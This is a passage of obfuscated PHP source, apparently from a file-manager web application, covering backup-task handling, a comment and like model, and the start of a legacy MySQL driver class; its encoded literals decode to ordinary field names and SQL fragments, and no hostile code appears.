$this->parseContent($¾ÍïÕª€); unset($¾ÍïÕª€[$÷ ËİÈƒ[1900]]); Model($÷ ËİÈƒ[1899])->cacheClear(); $æ×¶–Ó = $÷ ËİÈƒ[2160]; $ßõ¸ñ¿é = Model($÷ ËİÈƒ[2161])->findByKey($÷ ËİÈƒ[1515], $æ×¶–Ó); if (!$ßõ¸ñ¿é) { $ßõ¸ñ¿é = array(); } if (isset($ßõ¸ñ¿é[$÷ ËİÈƒ[205]])) { $ßõ¸ñ¿é[$÷ ËİÈƒ[205]] = json_decode($ßõ¸ñ¿é[$÷ ËİÈƒ[205]], !0); } if (isset($¾ÍïÕª€[$÷ ËİÈƒ[205]])) { $ßõ¸ñ¿é[$÷ ËİÈƒ[205]][$÷ ËİÈƒ[1903]] = $¾ÍïÕª€[$÷ ËİÈƒ[205]]; unset($¾ÍïÕª€[$÷ ËİÈƒ[205]]); } return array_merge($ßõ¸ñ¿é, $¾ÍïÕª€); } public function listData($®Ú‰ëÎ® = false, $Ûı§´øÍ = "\x6d\x6f\144\151\146\171\124\151\155\x65", $ø‘¨Ûï× = false) { $ƒŸî¸•› = parent::listData($®Ú‰ëÎ®, $Ûı§´øÍ, !0); if (!$ƒŸî¸•›) { return $ƒŸî¸•›; } if ($®Ú‰ëÎ®) { $ƒŸî¸•› = array($ƒŸî¸•›); } foreach ($ƒŸî¸•› as &$ø±±õ†’) { $this->parseContent($ø±±õ†’); } return $®Ú‰ëÎ® ? $ƒŸî¸•›[0] : $ƒŸî¸•›; } public function parseContent(&$ı„àÔØå) { $øª½†²œ =& $_SERVER[‘ÆÜ‘œ]; $§ êš±¼ = _get($ı„àÔØå, $øª½†²œ[169], $øª½†²œ[91]); if (!in_array($§ êš±¼, array($øª½†²œ[886], $øª½†²œ[1256]))) { $ı„àÔØå[$øª½†²œ[169]] = $§ êš±¼ == $øª½†²œ[91] ? $øª½†²œ[1256] : $øª½†²œ[886]; } } public function lastItem() { $ï®Üî = $this->listData(); return !empty($ï®Üî[0]) ? $ï®Üî[0] : null; } public function kill($‘æä®°Œ) { $œ™„•±Í =& $_SERVER[‘ÆÜ‘œ]; $ÎÖÌÃÍ = $this->listData($‘æä®°Œ); if (!$ÎÖÌÃÍ || empty($ÎÖÌÃÍ[$œ™„•±Í[32]])) { return !0; } Task::kill($œ™„•±Í[894]); Task::kill($œ™„•±Í[915]); Task::kill($œ™„•±Í[923]); $ğª†Ñ±Ô = $ÎÖÌÃÍ[$œ™„•±Í[32]]; $›ªşë–Ğ = TEMP_FILES . $œ™„•±Í[890] . $ğª†Ñ±Ô . $œ™„•±Í[8]; IO::remove($›ªşë–Ğ, !1); return $this->remove($‘æä®°Œ); } public function remove($ÉÀß¼“Ä) { $Œ©”ÙÁ = $this->listData($ÉÀß¼“Ä); if (!$Œ©”ÙÁ) { return !0; } return $this->backupRemove($Œ©”ÙÁ); } private function backupRemove($„†°¿Üş) { parent::remove($„†°¿Üş[$_SERVER[‘ÆÜ‘œ][495]]); $£†éÃÛÖ = $this->backupPath($„†°¿Üş); IO::remove($£†éÃÛÖ, !1); return !0; } private function backupPath($è“Ÿ‹”—) { $«íŸÙê =& $_SERVER[‘ÆÜ‘œ]; $Á£õû¨Õ = $è“Ÿ‹”—[$«íŸÙê[32]]; $‚ºŒ™ø = Model($«íŸÙê[880])->get($«íŸÙê[881]); $ßŠÊ = substr(md5($«íŸÙê[882] . $‚ºŒ™ø . $Á£õû¨Õ), 0, 8); return "\x7b\151\x6f\72{$è“Ÿ‹”—[$«íŸÙê[859]]}\x7d\x2f\x64\x61\x74\141\142\x61\x73\x65\57\x62\141\x63\153\x75\x70\x2f" . $Á£õû¨Õ . $«íŸÙê[11] . $ßŠÊ; } public function start() { $Á®Ç÷™» =& $_SERVER[‘ÆÜ‘œ]; if ($GLOBALS[$Á®Ç÷™»[6]][$Á®Ç÷™»[92]][$Á®Ç÷™»[2162]] != $Á®Ç÷™»[91]) { return !0; } $ˆÎê´ª© = $this->config(); if (!$ˆÎê´ª© || $ˆÎê´ª©[$Á®Ç÷™»[1900]] != $Á®Ç÷™»[91]) { return !1; } if ($ˆÎê´ª©[$Á®Ç÷™»[169]] == $Á®Ç÷™»[886]) { $¾©¼İŞÛ = Model($Á®Ç÷™»[880])->get($Á®Ç÷™»[1378]); if ($¾©¼İŞÛ == $Á®Ç÷™»[1379]) { $ˆÎê´ª©[$Á®Ç÷™»[169]] = $Á®Ç÷™»[1256]; } } $ÔŠã´Ä¹ = $this->process(); foreach ($ÔŠã´Ä¹ as $®½‰ì’·) { if ($®½‰ì’·) { return Task::restart($®½‰ì’·[$Á®Ç÷™»[495]]); } } $Ú®Ñ²¡ = new Backup(); $ş´ÈÕØ = $Ú®Ñ²¡->db(); if ($ş´ÈÕØ) { $ş´ÈÕØ = $Ú®Ñ²¡->dbFile(); if ($ş´ÈÕØ && $ˆÎê´ª©[$Á®Ç÷™»[169]] == $Á®Ç÷™»[886]) { $ş´ÈÕØ = $Ú®Ñ²¡->file(); } } Backup::set(array($Á®Ç÷™»[857] => 1, $Á®Ç÷™»[869] => time())); return !0; } public function process() { $ê™±ò¹ =& $_SERVER[‘ÆÜ‘œ]; $×êßÈÛ = array($ê™±ò¹[865] => Task::get($ê™±ò¹[894]), $ê™±ò¹[870] => Task::get($ê™±ò¹[915]), $ê™±ò¹[231] => Task::get($ê™±ò¹[923])); $Ü‘°âÅ˜ = !1; foreach ($×êßÈÛ as &$ÑòÉ©•¦) { if ($Ü‘°âÅ˜) { $ÑòÉ©•¦ = !1; continue; } if ($ÑòÉ©•¦) { $¹Ä©¯°» = intval(_get($ÑòÉ©•¦, $ê™±ò¹[1934], 0)); if (time() - $¹Ä©¯°» > 7200) { Task::kill($ÑòÉ©•¦[$ê™±ò¹[495]]); $Ü‘°âÅ˜ = !0; $ÑòÉ©•¦ = !1; } } } return $×êßÈÛ; } public function restore() { $õññÆ‘Ù =& $_SERVER[‘ÆÜ‘œ]; ActionCall($õññÆ‘Ù[2163], !0, 1); ActionCall($õññÆ‘Ù[2163], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\143\x6f\155\155\x65\x6e\164\137\155\145\x74\x61", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\x63\157\155\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ú¡‘è) { $»ç«©½ò =& $_SERVER[‘ÆÜ‘œ]; if ($ú¡‘è[$»ç«©½ò[2164]]) { $Ø©óÒÃü = $this->where(array($»ç«©½ò[2165] => $ú¡‘è[$»ç«©½ò[2164]]))->find(); if (!$Ø©óÒÃü || $Ø©óÒÃü[$»ç«©½ò[189]] != $ú¡‘è[$»ç«©½ò[189]] || $Ø©óÒÃü[$»ç«©½ò[597]] != $ú¡‘è[$»ç«©½ò[597]]) { return !1; } $this->where(array($»ç«©½ò[2165] => $ú¡‘è[$»ç«©½ò[2164]]))->setAdd($»ç«©½ò[2166], 1); } $ú¡‘è[$»ç«©½ò[2167]] = 0; $ú¡‘è[$»ç«©½ò[2166]] = 0; $ú¡‘è[$»ç«©½ò[857]] = 1; return $this->add($ú¡‘è); } public function commentCount($şş§¾·ø, $öšÆ¸Â§, $£×¬¨‡® = false) { $²µ´Ãİ„ =& $_SERVER[‘ÆÜ‘œ]; if (!$şş§¾·ø) { return array(); } if (is_string($şş§¾·ø) || is_int($şş§¾·ø)) { $şş§¾·ø = array($şş§¾·ø); } $å´‘ïç² = array($²µ´Ãİ„[597], $²µ´Ãİ„[2168] => $²µ´Ãİ„[593]); $ß¾¶íÍ = array($²µ´Ãİ„[597] => array($²µ´Ãİ„[7], $şş§¾·ø), $²µ´Ãİ„[189] => $öšÆ¸Â§); if ($£×¬¨‡®) { $ß¾¶íÍ[$²µ´Ãİ„[1544]] = $£×¬¨‡®; } $‡Èı¥œê = $this->field($å´‘ïç²)->where($ß¾¶íÍ)->group($²µ´Ãİ„[597])->select(); return array_to_keyvalue($‡Èı¥œê, $²µ´Ãİ„[597], $²µ´Ãİ„[593]); } public function starTarget($®ç¹ÇÑ´, $«¦²£º‰) { $Šô„™Òå =& $_SERVER[‘ÆÜ‘œ]; $èê½Õü¢ = $®ç¹ÇÑ´ + self::TYPE_STAR_OFFSET; $ÏçÖÉø§ = array($Šô„™Òå[1544] => USER_ID, $Šô„™Òå[189] => $èê½Õü¢, $Šô„™Òå[597] => $«¦²£º‰); $”¼Ú©ÔÛ = $this->where($ÏçÖÉø§)->find(); if ($”¼Ú©ÔÛ) { return $this->where(array($Šô„™Òå[495] => $”¼Ú©ÔÛ[$Šô„™Òå[495]]))->delete(); } $ê·ôğÎ³ = array($Šô„™Òå[2164] => 0, $Šô„™Òå[1544] => USER_ID, $Šô„™Òå[857] => 1, $Šô„™Òå[169] => $Šô„™Òå[12], $Šô„™Òå[189] => $èê½Õü¢, $Šô„™Òå[597] => $«¦²£º‰, $Šô„™Òå[2167] => 0, $Šô„™Òå[2166] => 0); return $this->add($ê·ôğÎ³); } public function starTargetCount($ã¸Œ€¿ó, $¯½Æš–) { $³ ÚÕŠØ =& $_SERVER[‘ÆÜ‘œ]; $·ğ¬à¿« = $¯½Æš– + self::TYPE_STAR_OFFSET; $‡Ô§çá¥ = $this->commentCount($ã¸Œ€¿ó, $·ğ¬à¿«); $šËäšû¶ = $this->commentCount($ã¸Œ€¿ó, $·ğ¬à¿«, USER_ID); return array($³ ÚÕŠØ[2169] => $‡Ô§çá¥, $³ ÚÕŠØ[2170] => $šËäšû¶); } public function starTargetUserList($àˆ£ˆ‘ù, $°ÚÂˆ×Ì) { $è±Ü“µü =& $_SERVER[‘ÆÜ‘œ]; $à•á‡âî = $àˆ£ˆ‘ù + self::TYPE_STAR_OFFSET; $ò‹¤—Í = array($è±Ü“µü[597] => $°ÚÂˆ×Ì, $è±Ü“µü[189] => $à•á‡âî); $”ÃŠÕ–µ = $this->where($ò‹¤—Í)->count(); $ìöäı‰– = array($è±Ü“µü[342] => $”ÃŠÕ–µ, $è±Ü“µü[2171] => array()); if (!$”ÃŠÕ–µ) { return $ìöäı‰–; } $úÄ˜“» = $this->field($è±Ü“µü[1544])->where($ò‹¤—Í)->limit(500)->select(); $úÄ˜“» = array_to_keyvalue($úÄ˜“», $è±Ü“µü[12], $è±Ü“µü[1544]); $ìöäı‰–[$è±Ü“µü[2171]] = Model($è±Ü“µü[605])->userListInfo($úÄ˜“»); return $ìöäı‰–; } public function prasiseUserList($ÙÇ•Ã…–) { $ÑÀ¯‰©á =& $_SERVER[‘ÆÜ‘œ]; $¦¹â…±ø = array($ÑÀ¯‰©á[2172] => $ÙÇ•Ã…–); $›ÉºÑÓ = $this->where($¦¹â…±ø)->find(); $—¢¯› = _get($›ÉºÑÓ, $ÑÀ¯‰©á[2167], 0); $éËì•ÜÒ = array($ÑÀ¯‰©á[342] => $—¢¯›, $ÑÀ¯‰©á[2171] => array()); if (!$—¢¯›) { return $éËì•ÜÒ; } $ı¤óŒıÈ = Model($ÑÀ¯‰©á[2173])->field($ÑÀ¯‰©á[1544])->where($¦¹â…±ø)->limit(500)->select(); $ı¤óŒıÈ = array_to_keyvalue($ı¤óŒıÈ, $ÑÀ¯‰©á[12], $ÑÀ¯‰©á[1544]); $éËì•ÜÒ[$ÑÀ¯‰©á[2171]] = Model($ÑÀ¯‰©á[605])->userListInfo($ı¤óŒıÈ); return $éËì•ÜÒ; } public function remove($¼ÚÎüŞ¹) { $šëıÎå =& $_SERVER[‘ÆÜ‘œ]; $â–û€Ô = array($šëıÎå[2165] => $¼ÚÎüŞ¹); $¾ü€ó¤Ì = $this->where($â–û€Ô)->find(); if ($¾ü€ó¤Ì[$šëıÎå[2164]]) { $this->where(array($šëıÎå[2165] => $¾ü€ó¤Ì[$šëıÎå[2164]]))->setAdd($šëıÎå[2166], -1); } return $this->removeArray($¼ÚÎüŞ¹); } public function edit($±üøé³Ë, $µ²†çˆ´) { $İ•ÊÉØ =& $_SERVER[‘ÆÜ‘œ]; $ğÈ«§ÀÜ = array($İ•ÊÉØ[2165] => $±üøé³Ë); return $this->where($ğÈ«§ÀÜ)->save(array($İ•ÊÉØ[2174] => $µ²†çˆ´)); } public function prasise($Š¹ ø’¹) { $Â­ÒÜ³Ô =& $_SERVER[‘ÆÜ‘œ]; $²ØäŒ¶‹ = Model($Â­ÒÜ³Ô[2175]); $½ë«ááï = array($Â­ÒÜ³Ô[2165] => $Š¹ ø’¹, $Â­ÒÜ³Ô[1921] => USER_ID); $¿œÜ”òÖ = $²ØäŒ¶‹->where($½ë«ááï)->find(); if (!$¿œÜ”òÖ) { $²ØäŒ¶‹->add($½ë«ááï); $¢¦Ã…Õ = $this->where(array($Â­ÒÜ³Ô[2165] => $Š¹ ø’¹))->setAdd($Â­ÒÜ³Ô[2167], 1); } else { $²ØäŒ¶‹->where($½ë«ááï)->delete(); $¢¦Ã…Õ = $this->where(array($Â­ÒÜ³Ô[2165] => $Š¹ ø’¹))->setAdd($Â­ÒÜ³Ô[2167], -1); } return $¢¦Ã…Õ; } public function targetInfo($Ò¾Àº©, $®ÁÎ°ÁÔ) { $áÉÄîÆñ =& $_SERVER[‘ÆÜ‘œ]; $ú‚Õ­ù² = array($áÉÄîÆñ[678] => $Ò¾Àº©, $áÉÄîÆñ[679] => $®ÁÎ°ÁÔ); $äè»ïªï = $this->where($ú‚Õ­ù²)->count(); $õæåÏÜÍ = "\x52\x49\107\110\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\145\x6e\x74\x5f\160\x72\x61\151\x73\x65\x20\x73\164\141\x72\40\x6f\156\40\143\x6f\x6d\155\145\156\164\x2e\x63\x6f\x6d\x6d\x65\156\x74\x49\104\40\75\x20\163\x74\141\162\56\143\x6f\x6d\155\145\156\164\x49\104"; $¿¢Ùğê = $this->alias($áÉÄîÆñ[439])->where($ú‚Õ­ù²)->join($õæåÏÜÍ, $áÉÄîÆñ[2176])->count(); $¶ Ùó›¶ = array($áÉÄîÆñ[2177] => $äè»ïªï, $áÉÄîÆñ[2178] => $¿¢Ùğê); return $¶ Ùó›¶; } public function listData($·Øİı‡ğ) { $üö›²Îß =& $_SERVER[‘ÆÜ‘œ]; if (isset($·Øİı‡ğ[$üö›²Îß[2179]])) { if ($·Øİı‡ğ[$üö›²Îß[2179]]) { $·Øİı‡ğ[$üö›²Îß[2172]] = array($üö›²Îß[1132], intval($·Øİı‡ğ[$üö›²Îß[2179]])); } unset($·Øİı‡ğ[$üö›²Îß[2179]]); } if (isset($·Øİı‡ğ[$üö›²Îß[2180]])) { if ($·Øİı‡ğ[$üö›²Îß[2180]]) { $·Øİı‡ğ[$üö›²Îß[2172]] = array($üö›²Îß[1129], intval($·Øİı‡ğ[$üö›²Îß[2180]])); } unset($·Øİı‡ğ[$üö›²Îß[2180]]); } return $this->_listData($·Øİı‡ğ); } private function _listData($ñëåÊÈ) { $¼ÕöØ¿ =& $_SERVER[‘ÆÜ‘œ]; $‰ÚÈ¹Ç = $this->where($ñëåÊÈ)->_makeOrder()->selectPage(100); $this->_listAppendParent($‰ÚÈ¹Ç[$¼ÕöØ¿[455]]); $this->_listAppendUser($‰ÚÈ¹Ç[$¼ÕöØ¿[455]]); $this->_listAppendMeta($‰ÚÈ¹Ç[$¼ÕöØ¿[455]]); return $‰ÚÈ¹Ç; } private function _makeOrder() { $ÅæÕÆÊÉ =& $_SERVER[‘ÆÜ‘œ]; $ªÀ¸¾à = array($ÅæÕÆÊÉ[2167], $ÅæÕÆÊÉ[2166], $ÅæÕÆÊÉ[232]); $«Œş÷ÛŒ = Input::get($ÅæÕÆÊÉ[552], $ÅæÕÆÊÉ[7], $ÅæÕÆÊÉ[520], $ªÀ¸¾à); $Œˆ¦Åˆ = Input::get($ÅæÕÆÊÉ[553], $ÅæÕÆÊÉ[7], $ÅæÕÆÊÉ[1923], array($ÅæÕÆÊÉ[2181], $ÅæÕÆÊÉ[548])); $ßóÉ¢¦ˆ = $«Œş÷ÛŒ . $ÅæÕÆÊÉ[53] . $Œˆ¦Åˆ; return $this->order($ßóÉ¢¦ˆ); } private function _listAppendParent(&$ƒ±‹¯Øê) { $ê÷ç»ò =& $_SERVER[‘ÆÜ‘œ]; $ÆĞå‹âş = array_unique(array_to_keyvalue($ƒ±‹¯Øê, $ê÷ç»ò[12], $ê÷ç»ò[2164])); $ÆĞå‹âş = array_remove_value($ÆĞå‹âş, $ê÷ç»ò[229]); if (!$ÆĞå‹âş) { return; } $ÔŸÄàÆÉ = $this->where(array($ê÷ç»ò[2165] => array($ê÷ç»ò[7], $ÆĞå‹âş)))->select(); $ÔŸÄàÆÉ = array_to_keyvalue($ÔŸÄàÆÉ, $ê÷ç»ò[2172]); foreach ($ƒ±‹¯Øê as &$„œ“ŒÕ¢) { if (isset($ÔŸÄàÆÉ[$„œ“ŒÕ¢[$ê÷ç»ò[2164]]])) { $„œ“ŒÕ¢[$ê÷ç»ò[2182]] = $ÔŸÄàÆÉ[$„œ“ŒÕ¢[$ê÷ç»ò[2164]]]; } } unset($„œ“ŒÕ¢); } private function _listAppendUser(&$“ïÊá) { $™èÏ„‹‘ =& $_SERVER[‘ÆÜ‘œ]; $‰×‰ÆÄ‹ = array_unique(array_to_keyvalue($“ïÊá, $™èÏ„‹‘[12], $™èÏ„‹‘[1544])); $‰×‰ÆÄ‹ = array_remove_value($‰×‰ÆÄ‹, $™èÏ„‹‘[229]); if (count($‰×‰ÆÄ‹) == 0) { return; } foreach ($“ïÊá as $ ‹†­‰‰) { if (isset($ ‹†­‰‰[$™èÏ„‹‘[2182]])) { $‰×‰ÆÄ‹[] = $ ‹†­‰‰[$™èÏ„‹‘[2182]][$™èÏ„‹‘[1544]]; } } $åŞĞ¾ùŠ = Model($™èÏ„‹‘[625])->userListInfo($‰×‰ÆÄ‹); foreach ($“ïÊá as &$ ‹†­‰‰) { $ ‹†­‰‰[$™èÏ„‹‘[692]] = $åŞĞ¾ùŠ[$ ‹†­‰‰[$™èÏ„‹‘[1544]]]; if (isset($ ‹†­‰‰[$™èÏ„‹‘[2182]])) { $ ‹†­‰‰[$™èÏ„‹‘[2182]][$™èÏ„‹‘[692]] = $åŞĞ¾ùŠ[$ ‹†­‰‰[$™èÏ„‹‘[2182]][$™èÏ„‹‘[1544]]]; } } unset($ ‹†­‰‰); } private function _listAppendMeta(&$ÊÑÓ¹Ü­) { $Ìîê±Ôó =& $_SERVER[‘ÆÜ‘œ]; $¦‘íË¦ = array_unique(array_to_keyvalue($ÊÑÓ¹Ü­, $Ìîê±Ôó[12], $Ìîê±Ôó[2172])); $¦‘íË¦ = array_remove_value($¦‘íË¦, $Ìîê±Ôó[229]); if (!$¦‘íË¦) { return; } foreach ($ÊÑÓ¹Ü­ as $ÌüÃ÷”÷) { if (isset($ÌüÃ÷”÷[$Ìîê±Ôó[2182]])) { $¦‘íË¦[] = $ÌüÃ÷”÷[$Ìîê±Ôó[2182]][$Ìîê±Ôó[2172]]; } } $ñ„ŞƒöÌ = $this->metaList($¦‘íË¦); if (!$ñ„ŞƒöÌ) { return !1; } foreach ($ÊÑÓ¹Ü­ as &$ÌüÃ÷”÷) { $ÌüÃ÷”÷[$Ìîê±Ôó[563]] = $ñ„ŞƒöÌ[$ÌüÃ÷”÷[$Ìîê±Ôó[2172]]]; if (isset($ÌüÃ÷”÷[$Ìîê±Ôó[2182]])) { $ÌüÃ÷”÷[$Ìîê±Ôó[2182]][$Ìîê±Ôó[563]] = $ñ„ŞƒöÌ[$ÌüÃ÷”÷[$Ìîê±Ôó[2182]][$Ìîê±Ôó[2172]]]; } } unset($ÌüÃ÷”÷); } private function metaList($ˆÁÙ¸òô) { $Ò˜²òå =& $_SERVER[‘ÆÜ‘œ]; if (!$ˆÁÙ¸òô) { return array(); } $¦¹ßö«á = array($Ò˜²òå[2172] => array($Ò˜²òå[7], $ˆÁÙ¸òô)); $º¿öÊúÀ = Model($Ò˜²òå[2183])->where($¦¹ßö«á)->select(); $º¿öÊúÀ = array_to_keyvalue_group($º¿öÊúÀ, $Ò˜²òå[2172]); foreach ($º¿öÊúÀ as $ÄöéÜ§â => $¡¥¶ëŠû) { $µöÆî¶ = array(); foreach ($¡¥¶ëŠû as $ÎáÆ’–¼) { $µöÆî¶[$ÎáÆ’–¼[$Ò˜²òå[95]]] = $ÎáÆ’–¼[$Ò˜²òå[460]]; } $º¿öÊúÀ[$ÄöéÜ§â] = $µöÆî¶; } return $º¿öÊúÀ ? $º¿öÊúÀ : array(); } public function removeTarget($ÇÚÇ†É˜, $‹Ï ™¼Å) { $÷‡¬ÊÈ¸ =& $_SERVER[‘ÆÜ‘œ]; if (!$‹Ï ™¼Å) { return !0; } $‹Ï ™¼Å = is_array($‹Ï ™¼Å) ? $‹Ï ™¼Å : array($‹Ï ™¼Å); $îºŸ·‘ñ = array($÷‡¬ÊÈ¸[189] => $ÇÚÇ†É˜, $÷‡¬ÊÈ¸[597] => array($÷‡¬ÊÈ¸[7], $‹Ï ™¼Å)); $ñöÂ¨‚ˆ = $this->field($÷‡¬ÊÈ¸[2172])->where($îºŸ·‘ñ)->select(); $¼è ÌÜ = array_to_keyvalue($ñöÂ¨‚ˆ, $÷‡¬ÊÈ¸[12], $÷‡¬ÊÈ¸[2172]); return $this->removeArray($¼è ÌÜ); } public function removeArray($ùüÃâã“) { $¹ãÉı…Á =& $_SERVER[‘ÆÜ‘œ]; if (!$ùüÃâã“) { return !0; } $ùüÃâã“ = is_array($ùüÃâã“) ? $ùüÃâã“ : array($ùüÃâã“); $ü©íñ÷Š = array($¹ãÉı…Á[2172] => array($¹ãÉı…Á[7], $ùüÃâã“)); Model($¹ãÉı…Á[2175])->where($ü©íñ÷Š)->delete(); Model($¹ãÉı…Á[2184])->where($ü©íñ÷Š)->delete(); return $this->where($ü©íñ÷Š)->delete(); } } goto CÇ£ÒÎÇµç; FßæÁÊ¼ï: class DbMysql extends Db { public function __construct($õ¢›°æ = '') { $À®àÒ¡— =& $_SERVER[‘ÆÜ‘œ]; if (!extension_loaded($À®àÒ¡—[910])) { think_exception(think_lang($À®àÒ¡—[14]) . $À®àÒ¡—[1000]); } if (!empty($õ¢›°æ)) { $this->config = $õ¢›°æ; if (empty($this->config[$À®àÒ¡—[17]])) { $this->config[$À®àÒ¡—[17]] = $À®àÒ¡—[12]; } } } public function connect($®Ô’ò¬¹ = '', $‚™±¯—ø = 0, $ºïÓ·»õ = false) { $¾‡‡ø· =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->linkID[$‚™±¯—ø])) { if (empty($®Ô’ò¬¹)) { $®Ô’ò¬¹ = $this->config; } $‡•Çûà = $®Ô’ò¬¹[$¾‡‡ø·[1001]] . ($®Ô’ò¬¹[$¾‡‡ø·[1002]] ? "\x3a{$®Ô’ò¬¹[$¾‡‡ø·[1002]]}" : $¾‡‡ø·[12]); $±´Õ÷« = !empty($®Ô’ò¬¹[$¾‡‡ø·[17]][$¾‡‡ø·[18]]) ? $®Ô’ò¬¹[$¾‡‡ø·[17]][$¾‡‡ø·[18]] : $this->pconnect; if ($±´Õ÷«) { $this->linkID[$‚™±¯—ø] = mysql_pconnect($‡•Çûà, $®Ô’ò¬¹[$¾‡‡ø·[1003]], $®Ô’ò¬¹[$¾‡‡ø·[1004]], 131072); } else { $this->linkID[$‚™±¯—ø] = mysql_connect($‡•Çûà, $®Ô’ò¬¹[$¾‡‡ø·[1003]], $®Ô’ò¬¹[$¾‡‡ø·[1004]], !0, 131072); } if (!$this->linkID[$‚™±¯—ø] || !empty($®Ô’ò¬¹[$¾‡‡ø·[21]]) && !mysql_select_db($®Ô’ò¬¹[$¾‡‡ø·[21]], $this->linkID[$‚™±¯—ø])) { think_exception(mysql_error()); } $Ş¬ÏäÅÒ = mysql_get_server_info($this->linkID[$‚™±¯—ø]); mysql_query($¾‡‡ø·[1005] . think_config($¾‡‡ø·[1006]) . $¾‡‡ø·[58], $this->linkID[$‚™±¯—ø]); if ($Ş¬ÏäÅÒ > $¾‡‡ø·[1007]) { mysql_query($¾‡‡ø·[1008], $this->linkID[$‚™±¯—ø]); } $this->connected = !0; if (1 != think_config($¾‡‡ø·[22])) { unset($this->config); } } return $this->linkID[$‚™±¯—ø]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($õ»«º¾à) { $ûÑçÓü´ =& $_SERVER[‘ÆÜ‘œ]; if (0 === stripos($õ»«º¾à, $ûÑçÓü´[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $õ»«º¾à; if ($this->queryID) { $this->free(); } think_action_status($ûÑçÓü´[23], 1); think_status($ûÑçÓü´[24]); $this->queryID = mysql_query($õ»«º¾à, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ã´ßó¬) { $‚–™°¬‡ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ã´ßó¬; if ($this->queryID) { $this->free(); } think_action_status($‚–™°¬‡[25], 1); think_status($‚–™°¬‡[24]); $°•—ÒÇÍ = mysql_query($ã´ßó¬, $this->_linkID); $this->debug(); if (!1 === $°•—ÒÇÍ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‘ÆÜ‘œ][1009], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹¤“©¬ = mysql_query($_SERVER[‘ÆÜ‘œ][1010], $this->_linkID); $this->transTimes = 0; if (!$¹¤“©¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶¿’ÈÔ = mysql_query($_SERVER[‘ÆÜ‘œ][1011], $this->_linkID); $this->transTimes = 0; if (!$¶¿’ÈÔ) { $this->error(); return !1; } } return !0; } private function getAll() { $˜¯è±š = array(); if ($this->numRows > 0) { while ($¨˜İî¥ = mysql_fetch_assoc($this->queryID)) { $˜¯è±š[] = $¨˜İî¥; } mysql_data_seek($this->queryID, 0); } return $˜¯è±š; } public function getFields($Î¥¢ï¦) { $úª…Øºü =& $_SERVER[‘ÆÜ‘œ]; $÷úÌŞ°¸ = $this->query($úª…Øºü[1012] . $this->parseKey($Î¥¢ï¦)); $í÷ÊÇø° = array(); if ($÷úÌŞ°¸) { foreach ($÷úÌŞ°¸ as $æ­™’ñ => $¹­®ı’Ü) { $í÷ÊÇø°[$¹­®ı’Ü[$úª…Øºü[31]]] = array($úª…Øºü[32] => $¹­®ı’Ü[$úª…Øºü[31]], $úª…Øºü[33] => $¹­®ı’Ü[$úª…Øºü[34]], $úª…Øºü[35] => (bool) (strtoupper($¹­®ı’Ü[$úª…Øºü[36]]) === $úª…Øºü[1013]), $úª…Øºü[37] => $¹­®ı’Ü[$úª…Øºü[38]], $úª…Øºü[39] => strtolower($¹­®ı’Ü[$úª…Øºü[40]]) == $úª…Øºü[41], $úª…Øºü[42] => strtolower($¹­®ı’Ü[$úª…Øºü[43]]) == $úª…Øºü[44]); } } return $í÷ÊÇø°; } public function getTables($ğˆšäÅ = '') { $°Áû¹Ğä =& $_SERVER[‘ÆÜ‘œ]; if (!empty($ğˆšäÅ)) { $ß™Íß† = $°Áû¹Ğä[1014] . $ğˆšäÅ . $°Áû¹Ğä[1015]; } else { $ß™Íß† = $°Áû¹Ğä[1016]; } $¶â¾À‹ = $this->query($ß™Íß†); $ƒôçöüî = array(); foreach ($¶â¾À‹ as $Íåèà­ => $ÂÚİÄùÖ) { $ƒôçöüî[$Íåèà­] = current($ÂÚİÄùÖ); } return $ƒôçöüî; } public function replace($°Şñª, $•¬É³è… = array()) { $Îñ‡ûÒø =& $_SERVER[‘ÆÜ‘œ]; foreach ($°Şñª as $æ‹’Å => $Úîô’ùÎ) { $®Ú·èğô = $this->parseValue($Úîô’ùÎ); if (is_scalar($®Ú·èğô)) { $Ëó®Ø®[] = $®Ú·èğô; $şĞÁÏ©¸[] = $this->parseKey($æ‹’Å); } } $­¨€‡ÊØ = $Îñ‡ûÒø[1017] . $this->parseTable($•¬É³è…[$Îñ‡ûÒø[367]]) . $Îñ‡ûÒø[1018] . implode($Îñ‡ûÒø[50], $şĞÁÏ©¸) . $Îñ‡ûÒø[1019] . implode($Îñ‡ûÒø[50], $Ëó®Ø®) . $Îñ‡ûÒø[1020]; return $this->execute($­¨€‡ÊØ); } public function insertAll($®Ù«§º£, $¼¤ìŞÆŠ = array(), $’ßº½èí = false) { $¨°µí¥ë =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($®Ù«§º£[0])) { return !1; } $Î—ÜÖ•¢ = array_keys($®Ù«§º£[0]); $ÔÓ»´àù = array(); foreach ($®Ù«§º£ as $ë¬ á†) { $ŒâãÚŸ = array(); foreach ($ë¬ á† as $‹Üí“¦Ô => $²ÙˆÃ²) { $²ÙˆÃ² = $this->parseValue($²ÙˆÃ²); if (is_scalar($²ÙˆÃ²)) { $ŒâãÚŸ[] = $²ÙˆÃ²; } } $ÔÓ»´àù[] = $¨°µí¥ë[347] . implode($¨°µí¥ë[50], 